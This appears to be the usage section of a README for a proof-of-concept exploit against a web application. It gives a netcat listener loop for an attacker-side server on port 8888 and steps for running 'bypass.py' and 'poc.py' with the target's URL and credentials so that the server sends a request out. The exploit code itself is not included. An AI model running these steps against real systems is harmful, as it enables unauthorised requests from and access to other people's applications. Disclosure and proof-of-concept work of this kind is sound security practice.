### Usage

Requirement: 

- Python3 with `requests` and `Pillow` library
- Setup the application with a user account

Execute:

- On server side, listen on port `8888` using `while true; do { echo -e "HTTP/1.0 200 OK\r\nContent-Length: 7\r\n\r\nSecret"; } | nc -lp 8888; done`
- Change `SERVER_URL`, `USER` ,`PASSWORD` and `PAYLOAD_URL` to match the setup
- Run `python bypass.py`
- `python poc.py`

A request will be received on server side. In this case, the response is also returned and will be printed out.
